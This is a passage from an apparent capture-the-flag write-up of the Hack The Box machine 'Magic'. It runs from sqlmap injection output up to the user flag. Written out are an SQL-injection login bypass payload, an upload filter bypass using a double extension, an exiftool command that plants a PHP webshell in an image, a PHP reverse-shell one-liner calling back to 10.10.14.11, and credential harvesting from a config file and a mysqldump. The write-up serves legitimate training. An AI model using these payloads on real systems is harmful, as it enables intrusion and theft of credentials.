<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL OR error-based - WHERE or HAVING clause (FLOOR)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.5 error-based - Parameter replace (EXP)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.7.8 error-based - Parameter replace (JSON_KEYS)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Generic inline queries&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL inline queries&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 stacked queries (comment)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 stacked queries&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &lt; 5.0.12 stacked queries (heavy query - comment)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &lt; 5.0.12 stacked queries (heavy query)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 AND time-based blind (SLEEP)&#39;</span>
<span style="color:#f92672">[</span>17:57:31<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 OR time-based blind (SLEEP)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 AND time-based blind (SLEEP - comment)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 OR time-based blind (SLEEP - comment)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP - comment)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP - comment)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &lt; 5.0.12 AND time-based blind (heavy query)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &lt; 5.0.12 OR time-based blind (heavy query)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &lt; 5.0.12 AND time-based blind (heavy query - comment)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &lt; 5.0.12 OR time-based blind (heavy query - comment)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 RLIKE time-based blind&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 RLIKE time-based blind (comment)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 RLIKE time-based blind (query SLEEP)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 RLIKE time-based blind (query SLEEP - comment)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL AND time-based blind (ELT)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL OR time-based blind (ELT)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL AND time-based blind (ELT - comment)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL OR time-based blind (ELT - comment)&#39;</span>
<span style="color:#f92672">[</span>17:57:32<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)&#39;</span>
<span style="color:#f92672">[</span>17:57:33<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)&#39;</span>
<span style="color:#f92672">[</span>17:57:33<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 time-based blind - Parameter replace&#39;</span>
<span style="color:#f92672">[</span>17:57:33<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)&#39;</span>
<span style="color:#f92672">[</span>17:57:33<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL &lt; 5.0.12 time-based blind - Parameter replace (heavy queries)&#39;</span>
<span style="color:#f92672">[</span>17:57:33<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL time-based blind - Parameter replace (bool)&#39;</span>
<span style="color:#f92672">[</span>17:57:33<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL time-based blind - Parameter replace (ELT)&#39;</span>
<span style="color:#f92672">[</span>17:57:33<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL time-based blind - Parameter replace (MAKE_SET)&#39;</span>
<span style="color:#f92672">[</span>17:57:33<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;Generic UNION query (NULL) - 1 to 20 columns&#39;</span>
<span style="color:#f92672">[</span>17:57:33<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> automatically extending ranges <span style="color:#66d9ef">for</span> UNION query injection technique tests as there is at least one other <span style="color:#f92672">(</span>potential<span style="color:#f92672">)</span> technique found
<span style="color:#f92672">[</span>17:57:35<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;</span>
<span style="color:#f92672">[</span>17:57:36<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL UNION query (random number) - 1 to 20 columns&#39;</span>
<span style="color:#f92672">[</span>17:57:38<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> target URL appears to be UNION injectable with <span style="color:#ae81ff">3</span> columns
<span style="color:#f92672">[</span>17:57:40<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> <span style="color:#66d9ef">if</span> UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS <span style="color:#f92672">(</span>e.g. <span style="color:#e6db74">&#39;--dbms=mysql&#39;</span><span style="color:#f92672">)</span> 
<span style="color:#f92672">[</span>17:57:40<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL UNION query (NULL) - 21 to 40 columns&#39;</span>
<span style="color:#f92672">[</span>17:57:42<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL UNION query (random number) - 21 to 40 columns&#39;</span>
<span style="color:#f92672">[</span>17:57:43<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL UNION query (NULL) - 41 to 60 columns&#39;</span>
<span style="color:#f92672">[</span>17:57:44<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL UNION query (random number) - 41 to 60 columns&#39;</span>
<span style="color:#f92672">[</span>17:57:46<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL UNION query (NULL) - 61 to 80 columns&#39;</span>
<span style="color:#f92672">[</span>17:57:47<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL UNION query (random number) - 61 to 80 columns&#39;</span>
<span style="color:#f92672">[</span>17:57:48<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL UNION query (NULL) - 81 to 100 columns&#39;</span>
<span style="color:#f92672">[</span>17:57:50<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing <span style="color:#e6db74">&#39;MySQL UNION query (random number) - 81 to 100 columns&#39;</span>
<span style="color:#f92672">[</span>17:57:51<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> in OR boolean-based injection cases, please consider usage of switch <span style="color:#e6db74">&#39;--drop-set-cookie&#39;</span> <span style="color:#66d9ef">if</span> you experience any problems during data retrieval
<span style="color:#f92672">[</span>17:57:51<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> checking <span style="color:#66d9ef">if</span> the injection point on POST parameter <span style="color:#e6db74">&#39;password&#39;</span> is a false positive
POST parameter <span style="color:#e6db74">&#39;password&#39;</span> is vulnerable. Do you want to keep testing the others <span style="color:#f92672">(</span><span style="color:#66d9ef">if</span> any<span style="color:#f92672">)</span>? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span> N
sqlmap identified the following injection point<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> with a total of <span style="color:#ae81ff">503</span> HTTP<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> requests:
---
Parameter: password <span style="color:#f92672">(</span>POST<span style="color:#f92672">)</span>
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username<span style="color:#f92672">=</span>1&amp;password<span style="color:#f92672">=</span>-9525<span style="color:#e6db74">&#39; OR 6168=6168 AND &#39;</span>nBvw<span style="color:#e6db74">&#39;=&#39;</span>nBvw
---
<span style="color:#f92672">[</span>17:58:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing MySQL
<span style="color:#f92672">[</span>17:58:02<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> confirming MySQL
<span style="color:#f92672">[</span>17:58:02<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> the back-end DBMS is MySQL
back-end DBMS: MySQL &gt;<span style="color:#f92672">=</span> 5.0.0
<span style="color:#f92672">[</span>17:58:02<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetched data logged to text files under <span style="color:#e6db74">&#39;/home/u915/.local/share/sqlmap/output/10.10.10.185&#39;</span>

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 17:58:02 /2020-08-02/

</code></pre></div><h3 id="login-bypass">Login Bypass</h3>
<p>Both methods worked to bypass the authentication:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">admin/password<span style="color:#f92672">=</span>-9525<span style="color:#e6db74">&#39; OR 6168=6168 AND &#39;</span>nBvw<span style="color:#e6db74">&#39;=&#39;</span>nBvw
</code></pre></div><h3 id="image-gallery-and-webshell">Image gallery and webshell</h3>
<p>Inside there is a form to upload images to the gallery.</p>
<p>I tried to upload php webshells but there is a filter extension. Saying that only jpeg,jpg and png are allowed.</p>
<p>Also, I tried to upload php code inside the file with a image extension but it is filtering the content too.</p>
<p><img src="/images/posts/htb_magic_1.png" alt="alt text" title="HTB Magic uploading images with custom payload"></p>
<p>I tried custom common payloads using images, to bypass the file extension, and I could upload images using double extension:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ok.php.png
</code></pre></div><p><img src="/images/posts/htb_magic_2.png" alt="alt text" title="HTB Magic php double extension Bypass"></p>
<p>Bypassing the filter, looks like the file extension is under control, now I need to upload PHP code.</p>
<p>I am using exiftool to generate a custom payload inside the image, to generate a basic webshell:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">exiftool -Comment<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;?php echo &#39;&lt;form action=\&#39;&#39;.\$PHP_SELF.&#39;\&#39; method=\&#39;post\&#39;&gt;Command:&lt;input type=\&#39;text\&#39; name=\&#39;cmd\&#39;&gt;&lt;input type=\&#39;submit\&#39;&gt;&lt;/form&gt;&#39;; if(\$_POST){system(\$_POST[&#39;cmd&#39;]);} __halt_compiler();&#34;</span> ok2.jpeg
</code></pre></div><p><img src="/images/posts/htb_magic_3.png" alt="alt text" title="HTB Magic php Webshell uploaded"></p>
<p>Great! I got the webshell uploaded</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
</code></pre></div><h3 id="reverse-shell">Reverse shell</h3>
<p>Upgrade the shell, because working on the webshell is hard:</p>
<p>Listener on my machine:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvp <span style="color:#ae81ff">1234</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;10.10.14.11&#34;,1234);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>

</code></pre></div><p>With the reverse shell enabled I started enumerating again.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat db.php5   
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Database</span>
{
    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> $dbName <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Magic&#39;</span> ;
    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> $dbHost <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span> ;
    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> $dbUsername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;theseus&#39;</span>;
    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> $dbUserPassword <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;iamkingtheseus&#39;</span>;

    [<span style="color:#f92672">...</span>]
</code></pre></div><p>Username/Password inside the file <em>/var/www/Magic/db.php5</em></p>
<p>I tried to use the username and password to log in on the system but without sucesss.</p>
<p>So, with the db credentials, the next step is MySQL.</p>
<h3 id="working-with-mysql">Working with MySQL</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
ps -ef | grep mysql
mysql     <span style="color:#ae81ff">1133</span>     <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">0</span> 08:18 ?        00:00:04 /usr/sbin/mysqld --daemonize --pid-file<span style="color:#f92672">=</span>/run/mysqld/mysqld.pid
www-data  <span style="color:#ae81ff">2408</span>  <span style="color:#ae81ff">2386</span>  <span style="color:#ae81ff">0</span> 10:03 pts/0    00:00:00 grep mysql


$ locate mysql | grep bin
locate mysql | grep bin
/etc/apparmor.d/usr.sbin.mysqld
/etc/apparmor.d/cache/usr.sbin.mysqld
/etc/apparmor.d/local/usr.sbin.mysqld
/usr/bin/mysql_config_editor
/usr/bin/mysql_embedded
/usr/bin/mysql_install_db
/usr/bin/mysql_plugin
/usr/bin/mysql_secure_installation
/usr/bin/mysql_ssl_rsa_setup
/usr/bin/mysql_tzinfo_to_sql
/usr/bin/mysql_upgrade
/usr/bin/mysqladmin
/usr/bin/mysqlanalyze
/usr/bin/mysqlbinlog
/usr/bin/mysqlcheck
/usr/bin/mysqld_multi
/usr/bin/mysqld_safe
/usr/bin/mysqldump
/usr/bin/mysqldumpslow
/usr/bin/mysqlimport
/usr/bin/mysqloptimize
/usr/bin/mysqlpump
/usr/bin/mysqlrepair
/usr/bin/mysqlreport
/usr/bin/mysqlshow
/usr/bin/mysqlslap
/usr/sbin/mysqld
/usr/share/man/man1/mysqlbinlog.1.gz
</code></pre></div><p>Dumping the Mysql database:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>mysqldump <span style="color:#f92672">-</span>u theseus <span style="color:#f92672">-</span>p Magic
<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>mysqldump <span style="color:#f92672">-</span>u theseus <span style="color:#f92672">-</span>p Magic
Enter password: iamkingtheseus

<span style="color:#75715e">-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
</span><span style="color:#75715e">--
</span><span style="color:#75715e">-- Host: localhost    Database: Magic
</span><span style="color:#75715e">-- ------------------------------------------------------
</span><span style="color:#75715e">-- Server version       5.7.29-0ubuntu0.18.04.1
</span><span style="color:#75715e"></span>
<span style="color:#75715e">/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */</span>;
<span style="color:#75715e">/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */</span>;
<span style="color:#75715e">/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */</span>;
<span style="color:#75715e">/*!40101 SET NAMES utf8 */</span>;
<span style="color:#75715e">/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */</span>;
<span style="color:#75715e">/*!40103 SET TIME_ZONE=&#39;+00:00&#39; */</span>;
<span style="color:#75715e">/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */</span>;
<span style="color:#75715e">/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */</span>;
<span style="color:#75715e">/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&#39;NO_AUTO_VALUE_ON_ZERO&#39; */</span>;
<span style="color:#75715e">/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */</span>;

<span style="color:#75715e">--
</span><span style="color:#75715e">-- Table structure for table `login`
</span><span style="color:#75715e">--
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">DROP</span> <span style="color:#66d9ef">TABLE</span> <span style="color:#66d9ef">IF</span> <span style="color:#66d9ef">EXISTS</span> <span style="color:#f92672">`</span>login<span style="color:#f92672">`</span>;
<span style="color:#75715e">/*!40101 SET @saved_cs_client     = @@character_set_client */</span>;
<span style="color:#75715e">/*!40101 SET character_set_client = utf8 */</span>;
<span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">TABLE</span> <span style="color:#f92672">`</span>login<span style="color:#f92672">`</span> (
  <span style="color:#f92672">`</span>id<span style="color:#f92672">`</span> int(<span style="color:#ae81ff">6</span>) <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span> AUTO_INCREMENT,
  <span style="color:#f92672">`</span>username<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">50</span>) <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
  <span style="color:#f92672">`</span>password<span style="color:#f92672">`</span> varchar(<span style="color:#ae81ff">100</span>) <span style="color:#66d9ef">NOT</span> <span style="color:#66d9ef">NULL</span>,
  <span style="color:#66d9ef">PRIMARY</span> <span style="color:#66d9ef">KEY</span> (<span style="color:#f92672">`</span>id<span style="color:#f92672">`</span>),
  <span style="color:#66d9ef">UNIQUE</span> <span style="color:#66d9ef">KEY</span> <span style="color:#f92672">`</span>username<span style="color:#f92672">`</span> (<span style="color:#f92672">`</span>username<span style="color:#f92672">`</span>)
) ENGINE<span style="color:#f92672">=</span>InnoDB AUTO_INCREMENT<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">DEFAULT</span> CHARSET<span style="color:#f92672">=</span>latin1;
<span style="color:#75715e">/*!40101 SET character_set_client = @saved_cs_client */</span>;

<span style="color:#75715e">--
</span><span style="color:#75715e">-- Dumping data for table `login`
</span><span style="color:#75715e">--
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">LOCK</span> TABLES <span style="color:#f92672">`</span>login<span style="color:#f92672">`</span> <span style="color:#66d9ef">WRITE</span>;
<span style="color:#75715e">/*!40000 ALTER TABLE `login` DISABLE KEYS */</span>;
<span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">`</span>login<span style="color:#f92672">`</span> <span style="color:#66d9ef">VALUES</span> (<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;admin&#39;</span>,<span style="color:#e6db74">&#39;Th3s3usW4sK1ng&#39;</span>);
<span style="color:#75715e">/*!40000 ALTER TABLE `login` ENABLE KEYS */</span>;
UNLOCK TABLES;
<span style="color:#75715e">/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */</span>;

<span style="color:#75715e">/*!40101 SET SQL_MODE=@OLD_SQL_MODE */</span>;
<span style="color:#75715e">/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */</span>;
<span style="color:#75715e">/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */</span>;
<span style="color:#75715e">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */</span>;
<span style="color:#75715e">/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */</span>;
<span style="color:#75715e">/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */</span>;
<span style="color:#75715e">/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */</span>;

<span style="color:#75715e">-- Dump completed on 2020-08-02 10:11:09
</span></code></pre></div><p>Inside there is another username and password:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">`</span>login<span style="color:#f92672">`</span> <span style="color:#66d9ef">VALUES</span> (<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;admin&#39;</span>,<span style="color:#e6db74">&#39;Th3s3usW4sK1ng&#39;</span>);
</code></pre></div><h3 id="user-theseus-and-user-flag">User theseus and user flag</h3>
<p>Testing the new credentials:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ su theseus
su theseus
Password: Th3s3usW4sK1ng

theseus@ubuntu:/tmp/test$ 

theseus@ubuntu:~$ cat user.txt
cat user.txt
304<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span><span style="color:#ae81ff">710</span>
</code></pre></div><p>User flag done.</p>
